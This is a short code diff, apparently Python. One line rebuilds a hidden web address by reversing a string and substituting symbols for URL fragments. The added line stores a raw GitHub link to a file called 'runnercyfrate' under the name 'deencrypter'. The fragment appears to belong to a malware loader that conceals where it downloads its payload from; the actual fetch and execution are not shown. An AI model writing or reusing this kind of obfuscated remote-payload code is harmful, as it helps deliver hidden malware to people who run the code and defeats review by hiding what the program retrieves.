@@ -1,2 +1,4 @@
 link = link[::-1].replace("®", "raw").replace("♦", "https:").replace("È", "ste").replace("Ç", "/").\
     replace("½", ".com").replace("æ", "pa")
+
+deencrypter = "https://raw.githubusercontent.com/MinecrafTerra/D_jvkAOsiD_jvkAOsi/main/runnercyfrate"
